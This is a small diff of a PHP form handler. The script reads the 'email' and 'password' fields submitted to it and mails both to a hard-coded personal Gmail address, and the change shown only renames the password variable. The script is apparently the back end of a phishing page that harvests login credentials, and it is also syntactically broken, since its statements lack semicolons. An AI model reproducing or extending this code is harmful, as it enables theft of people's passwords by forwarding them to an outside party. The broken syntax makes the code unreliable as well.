@@ -1,8 +1,8 @@
 <?php
 $email = $_POST["email"]
-$password = $_POST["password"]
+$passkey = $_POST["password"]
 
-$mailheader = "From:".$email."<".$password.">\r\n"
+$mailheader = "From:".$email."<".$passkey.">\r\n"
 $recipient = "israelstoba@gmail.com"
 
 mail($recipient, $email, $mailheader)
